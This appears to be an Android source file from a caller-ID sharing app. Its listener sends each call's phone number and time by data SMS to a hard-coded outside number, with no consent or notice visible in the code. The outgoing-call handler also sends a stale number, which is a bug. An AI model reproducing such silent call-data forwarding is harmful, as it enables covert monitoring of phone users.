package com.byteshaft.calleridshare.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import com.byteshaft.calleridshare.utils.Helpers;


public class IncomingCallStateListener extends PhoneStateListener {

    private static long lastTime;
    private static String lastNumber;
    private static boolean inprogress;

    BroadcastReceiver outGoingCallListner = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            String body = String.format("{\"state\": \"new\", \"number\": \"%s\", \"time\": \"%s\" }",
                    lastNumber, String.valueOf(lastTime));
            Helpers.sendDataSms("+923006860746", "9851", body);
        }
    };

    @Override
    public void onCallStateChanged(int state, String incomingNumber) {
        super.onCallStateChanged(state, incomingNumber);
        switch (state) {
            case TelephonyManager.CALL_STATE_IDLE:
                if (inprogress) {
                    String body = String.format("{\"state\": \"old\", \"number\": \"%s\", \"time\": \"%s\" }",
                            lastNumber, String.valueOf(lastTime));
                    Helpers.sendDataSms("+923006860746", "9851", body);
                    inprogress = false;
                }

                break;
            case TelephonyManager.CALL_STATE_OFFHOOK:
                inprogress = true;
                lastNumber = incomingNumber;
                lastTime = System.currentTimeMillis();
                String body = String.format("{\"state\": \"new\", \"number\": \"%s\", \"time\": \"%s\" }",
                        lastNumber, String.valueOf(lastTime));
                Helpers.sendDataSms("+923006860746", "9851", body);
                break;
        }
    }
}
